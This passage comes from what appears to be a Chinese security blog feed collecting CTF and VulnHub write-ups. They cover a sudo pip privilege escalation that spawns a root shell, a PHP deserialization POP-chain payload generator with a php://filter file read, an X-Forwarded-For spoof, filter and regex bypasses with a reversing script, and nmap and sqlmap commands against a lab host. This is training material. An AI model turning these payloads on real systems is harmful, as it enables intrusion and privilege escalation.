GTFOBins</a> 找到如何提权。一次执行下面三行代码： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. TF=$(mktemp -d)</span><br><span class="line">2. echo &quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot; &gt; $TF/setup.py</span><br><span class="line">3. sudo /usr/bin/pip install $TF</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528231058.png" /></p>
<p>最后查看2个flag以及一个不知道是不是彩蛋的东西 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /home/icex64/user.txt</span><br><span class="line">2. /root/root.txt</span><br><span class="line">3. /home/arsene/.secret</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">5. 总结</h1>
<p>该靶机不算太难，主要是路径扫描可能得费点功夫。涉及的攻击方法有：</p>
<ol type="1">
<li>路径扫描</li>
<li>ssh's passphrase破解</li>
<li>sudo提权</li>
<li>python代码执行顺序</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>sudo提权</tag>
        <tag>路径扫描</tag>
        <tag>ssh密码破解</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020 Ezpop</title>
    <url>/2022/04/15/MRCTF2020%20Ezpop/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BMRCTF2020%5DEzpop">Ezpop</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，直接得到如下源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123; </span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="解题">解题</h1>
<h2 id="寻找pop链">寻找POP链</h2>
<p>首先寻找POP链的头部，即如下代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br></pre></td></tr></table></figure></p>
<p>传入一个序列化后的字符串。</p>
<p>接着寻找POP链尾部，注意到<code>Modifier</code>类中的<code>__invoke()</code>魔术方法中存在这文件包含漏洞，因此可以利用<code>include(''/flag')</code>获得flag，这就是尾部。</p>
<p>然后顺着尾部往上爬。当类被当作函数执行的时候，就会自动调用<code>__invoke()</code>魔术方法。而能够把类当作函数执行的只有<code>$function();</code>。若<code>$function=new Modifier()</code>时，就会调用<code>__invoke()</code>。</p>
<p><code>$function();</code>在<code>Test</code>类中的<code>__get()</code>魔术方法中，而当读取不可访问的属性的值时，该魔术方法才会调用。此时注意到<code>Show</code>类中的<code>return $this-&gt;str-&gt;source;</code>，如果<code>$this-&gt;str=new Test()</code>，那么<code>Test</code>类对象中并不存在<code>source</code>属性，从而就会触发<code>__get()</code>魔术方法。</p>
<p>而<code>return $this-&gt;str-&gt;source;</code>被魔术方法<code>__toString()</code>调用，当类被当作字符串执行的时候，才会自动调用该魔术方法。唯一比较绕的就是这里。我们可以创建两个<code>Show</code>类的对象a,b，然后令<code>$a-&gt;source=$b</code>，该类中的<code>__wakeup()</code>魔术方法会执行<code>preg_match()</code>，这样就实现了将<code>Show</code>类当作字符串，从而触发<code>__toString()</code>魔术方法。</p>
<p>通过我们输入，传入一个<code>Show</code>类的序列化后的字符串，设置合适的属性值，即可触发整个POP链。</p>
<p>综上，POP链如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">传入Show类的序列化后的字符串-&gt;调用__toString()-&gt;调用Test类中的__get()魔术方法-&gt;调用Modifier类中的__invoke()魔术方法-&gt;调用Modifier类中的append()方法，将flag文件包含</span><br></pre></td></tr></table></figure></p>
<h2 id="payload构造">payload构造</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="variable">$b</span>;  <span class="comment"># 触发__tpString</span></span><br><span class="line"><span class="variable">$b</span>-&gt;str = <span class="variable">$c</span>;     <span class="comment"># 触发__get</span></span><br><span class="line">(<span class="variable">$b</span>-&gt;str)-&gt;p = <span class="variable">$d</span>;<span class="comment"># 触发__invoke</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输入上面代码得到的字符串，其实并没有出现Flag，而是出现提示<code>Help Me Find FLAG!</code>。此时想到，可以利用伪协议配合文件包含读取文件内容。</p>
<p>因此将<code>Modifier</code>类中的<code>$var</code>属性的值替换掉：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>将获得的内容进行base64解码即可得到flag。</p>
<h1 id="总结">总结</h1>
<p>本题考察的是反序列化中的POP链。主要是将POP链从头到尾理清楚即可。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
        <tag>PHP伪协议</tag>
        <tag>POP</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020 PYWebsite</title>
    <url>/2022/04/13/MRCTF2020%20PYWebsite/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BMRCTF2020%5DPYWebsite">PYWebsite</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境之后，发现页面很复杂。先查看源码，发现</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231227.png" /></p>
<p>这是后面输入授权码的时候触发的，最开始还以为绕过<code>hex_md5</code>就可以了。在这串代码中还有一个<code>./flag.php</code>。</p>
<p>访问该文件得到如下界面</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231351.png" /></p>
<h1 id="解题">解题</h1>
<p>重点的提示<strong>已经记住了购买者的IP......除了购买者和我自己，没人可以看到flag</strong>。意思就是，要么我们自己购买，要么使用出题者的IP就可以看到flag。前者显然不可能，那么只有后者，这时候想到了一个HTTP头部信息<code>X-Forwarded-For</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231606.png" /></p>
<p>flag在源码中可以查看</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231627.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020 套娃</title>
    <url>/2022/04/21/MRCTF2020%20%E5%A5%97%E5%A8%83/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BMRCTF2020%5D套娃">MRCTF2020
套娃</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p>进入环境查看页面源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(substr_count(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure></p>
<p>除此之外，没有更多有用的信息了。</p>
<h1 id="解题">2. 解题</h1>
<h2 id="前置知识">2.1. 前置知识</h2>
<h3 id="server">2.1.1. <code>$_SERVER</code></h3>
<blockquote>
<p>$_SERVER 是 PHP
预定义变量之一，可以直接使用，它是一个包含了诸如头信息（header）、路径（path）及脚本位置（script
locations）信息的数组。</p>
</blockquote>
<p>参考链接：</p>
<ul>
<li>c.biancheng.net/view/6185.html</li>
</ul>
<p>这里主要介绍一下题目中的<code>$_SERVER['QUERY_STRING']</code>。假设我们的url为
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.hdfzzf.com/index.php/?name=m1ku&amp;city=beijing</span><br></pre></td></tr></table></figure></p>
<p>那么经过<code>$query = $_SERVER['QUERY_STRING'];</code>之后，<code>$query</code>变为：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query = name=m1ku&amp;city=beijing</span><br></pre></td></tr></table></figure></p>
<p>即，该代码作用就是获得url中的参数部分。</p>
<h3 id="substr_count">2.1.2. substr_count()</h3>
<p>该函数的作用非常简单，那就是<strong>计算子串在字符串中出现的次数</strong>。</p>
<p>一个例子： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算 Shanghai 在字符串中出现的次数</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> substr_count(<span class="string">&quot;I love Shanghai. Shanghai is the biggest city in china.&quot;</span>,<span class="string">&quot;Shanghai&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果为：2</p>
<p>注意：该函数区分大小写。将上面例子稍作修改： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算 shanghai 在字符串中出现的次数</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> substr_count(<span class="string">&quot;I love Shanghai. Shanghai is the biggest city in china.&quot;</span>,<span class="string">&quot;shanghai&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>此时结果为：0</p>
<h3 id="preg_matchpattern-string">2.1.3. preg_match(pattern,
string)</h3>
<p>PHP中的正则匹配，返回值是匹配次数。<strong>它的值为0或者1</strong>，这是因为第一次匹配到的时候就会结束该函数。如果需要一直搜索到结尾，可以使用preg_match_all(pattern,
string)。</p>
<p>需要注意的是，正则匹配默认都是匹配一行的，如果需要匹配多行，需要在正则表达式的最后加上<code>m</code>。</p>
<h3 id="getip">2.1.4. getIp()</h3>
<p>源码如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">                <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">                        <span class="string">&quot;unknown&quot;</span>)</span><br><span class="line">                ) &#123;</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> getIp();</span><br></pre></td></tr></table></figure></p>
<p>简单总结一下就是该函数通过HTTP头部中的<code>client-ip</code>来获取客户端的IP。</p>
<h2 id="解题过程">2.2. 解题过程</h2>
<h3 id="套娃1">2.2.1. 套娃1</h3>
<p>根据代码审计可以知道：</p>
<ul>
<li>要绕过if，即查询语句不能包含<code>_</code>以及<code>%5f</code>，后者就是前者url编码之后的结果；</li>
<li>b_u_p_t的值不能为23333，又得满足preg_match函数的返回值为1</li>
</ul>
<p>因为substr_count()函数区分大小写，因此可以使用大小写绕过，即<code>%5F</code>即可。</p>
<p>而preg_match默认只匹配一行，假设我们输入如下：(%oa是换行符的url编码)
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">23333%0a</span><br></pre></td></tr></table></figure></p>
<p>那么preg_match函数只匹配第一行，第一行只有23333，因此满足以23333开头，以23333结尾的要求，从而返回值为1。并且，此时的值不是23333，因为最后有一个换行符，因此绕过强类型匹配。</p>
<p>从而payload为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?b%5Fu%5Fp%5Ft=23333%0a</span><br></pre></td></tr></table></figure></p>
<p>得到如下提示：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220421094613.png" /></p>
<h3 id="套娃2">2.2.2. 套娃2</h3>
<p>去访问对应的文件，得到如下提示：（我还以为改一下XFF就可以，天真）
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag is here~But how to get it?Local access only!  </span><br><span class="line">Sorry,you don&#x27;t have permission! Your ip is :sorry,this way is banned!</span><br></pre></td></tr></table></figure></p>
<p>查看源码，得到一串不知名的注释，这里有一个小技巧，可以将这个注释放入控制台执行。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220421094919.png" /></p>
<p>因此POST请求，带入参数Merak，得到如下源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = base64_decode(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>从源码中可以得到以下信息：</p>
<ul>
<li>flag应该在flag.php中</li>
<li>这里获得客户端IP不是通过XFF，而是通过client-ip</li>
<li>GET方式传入2333，并且得满足<code>file_get_contents($_GET['2333']) === 'todat is a happy day'</code></li>
<li>利用最后的file_get_contents()读取flag.php中的内容，但是需要经过change()函数</li>
</ul>
<p>第三点可以通过<code>php://input [POSTt] odat is happy day</code>绕过。</p>
<p>这里主要说面一下change函数的绕过。我们的目的是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">change($_GET[&#x27;file&#x27;]) -&gt; flag.php</span><br></pre></td></tr></table></figure></p>
<p>即，我们输入payload，经过change函数，变成flag.php。因此我们可以根据change函数写出它的逆过程。代码如下：
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">v</span>):</span>  </span><br><span class="line">    re = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    v = base64.b64decode(v).decode(<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment"># byte -&gt; str  </span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(v)):  </span><br><span class="line">        re += <span class="built_in">chr</span>((<span class="built_in">ord</span>(v[i]) + i*<span class="number">2</span>))  </span><br><span class="line">          </span><br><span class="line">    <span class="keyword">return</span> re  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unchange</span>(<span class="params">fileName</span>):</span>  </span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(fileName)):  </span><br><span class="line">         payload += <span class="built_in">chr</span>(<span class="built_in">ord</span>(fileName[i]) - <span class="number">2</span>*i)  </span><br><span class="line">  </span><br><span class="line">    payload = base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment"># str -&gt; byte  </span></span><br><span class="line">    <span class="keyword">return</span> payload.decode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    fileName = <span class="string">&#x27;flag.php&#x27;</span>  </span><br><span class="line">    payload = unchange(fileName)  </span><br><span class="line">    <span class="built_in">print</span>(payload)  <span class="comment"># 最终的payload</span></span><br><span class="line">    <span class="built_in">print</span>(change(payload)) <span class="comment"># 验证是否正确</span></span><br></pre></td></tr></table></figure></p>
<p>最后得到payload为：ZmpdYSZmXGI=</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220421095706.png" /></p>
<h1 id="总结">3. 总结</h1>
<p>考察了：</p>
<ul>
<li>substr_count()区分大小写</li>
<li>php://input伪协议绕过</li>
<li>函数逆向</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP伪协议</tag>
        <tag>PHP基础知识</tag>
        <tag>函数逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Mercury Writeup</title>
    <url>/2022/05/18/Mercury%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度不高。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/the-planets-mercury,544/">The
Planets: Mercury ~ VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到2个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>低</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.51</span><br><span class="line">3. sudo nmap -p22,8080 -A 10.0.2.51</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518185013.png" /></p>
<p>服务版本信息没有贴出来，不过nmap能够扫出来。</p>
<h2 id="网页信息">2.2. 网页信息</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518185715.png" /></p>
<p>路径扫描也只有一个robots.txt，没有任何有用的信息。解析来随便输入一个目录，发现报错界面</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518190706.png" /></p>
<p>访问红框中的目录，得到如下界面：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518190740.png" /></p>
<p>点击 Load a fact 和 See list，内容分别为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Load a fact</span><br><span class="line">Fact id: 1. ((&#x27;Mercury does not have any moons or rings.&#x27;,),)</span><br><span class="line"></span><br><span class="line">// See list</span><br><span class="line">Still todo:</span><br><span class="line"></span><br><span class="line">-   Add CSS.</span><br><span class="line">-   Implement authentication (using users table)</span><br><span class="line">-   Use models in django instead of direct mysql call</span><br><span class="line">-   All the other stuff, so much!!!</span><br></pre></td></tr></table></figure>
<p>然后进行路径扫描，没有任何结果，又回到 Load a fact
界面，发现url上面有数字1，测试是否存在sql注入</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518191340.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518191348.png" /></p>
<p>确实存在SQL注入（其实这里先用单引号会出现报错界面，会提示SQL语句错误，因此判断这里可能存在SQL注入）</p>
<p>直接丢入sqlmap跑，这里注意需要把1后面的斜杆去掉： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -url http://10.0.2.51:8080/mercuryfacts/1 --dbs</span><br></pre></td></tr></table></figure></p>
